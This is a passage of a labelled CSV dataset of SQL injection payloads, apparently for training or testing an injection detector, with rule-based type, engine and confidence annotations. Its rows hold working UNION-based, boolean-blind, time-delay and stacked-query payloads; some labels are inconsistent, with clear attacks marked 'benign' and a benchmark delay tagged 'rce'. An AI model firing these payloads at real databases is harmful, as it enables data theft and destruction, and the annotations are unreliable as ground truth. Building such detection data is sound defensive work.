row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
7980,"-4802 union all select 7381,7381,7381,7381,7381,7381,7381,7381,7381,7381--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
7981,1' ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( 'uwbt' like 'uwbt,1,,boolean_blind,generic,0.95,") and (, like ' detected — boolean_blind injection (priority 8) on generic",rule-based
7982,select ( case when ( 4994 = 1572 ) then 4994 else 4994* ( select 4994 from mysql.db ) end ) #,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
7983,-2784 ) where 5261 = 5261 or 3472 = 1728#,1,,boolean_blind,generic,0.95,5261 = 5261 or detected — boolean_blind injection (priority 8) on generic,rule-based
7984,"1"" ) ) ) and ( 3020 = 3020 ) *6703 and ( ( ( ""fqap"" like ""fqap",1,,boolean_blind,generic,0.95,") and (, like "" detected — boolean_blind injection (priority 8) on generic",rule-based
7985,"1"" ) rlike sleep ( 5 ) and ( ""rfsd"" = ""rfsd",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
7986,1'|| ( select 'xmoq' from dual where 8047 = 8047 and 7533 = 7533 ) ||',1,,boolean_blind,oracle,0.95,8047 = 8047 and detected — boolean_blind injection (priority 8) on oracle,rule-based
7987,1%' ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( '%' = ',1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
7988,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( ""uhvy"" = ""uhvy",1,,rce,generic,0.95,0x4c4d6142 detected — rce injection (priority 1) on generic,rule-based
7989,1 and ( 1977 = 6852 ) *6852-- clxl,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
7990,"1' ) as xhmm where 8092 = 8092 union all select null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
7991,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) -- ygbf",1,,time_blind,sqlite,0.95,randomblob ( is SQLite-specific time-delay function — time-based blind inference (priority 5),rule-based
7992,"-5989%"" union all select 3581,3581,3581,3581,3581--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
7993,"1"" and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
7994,"-9078 union all select 3779,3779,3779,3779,3779,3779,3779,3779--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
7995,1' ) order by 1#,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
7996,if ( 6624 = 4232 ) select 6624 else drop function xyyt--,1,,stacked_queries,generic,0.95,drop function detected — stacked_queries injection (priority 3) on generic,rule-based
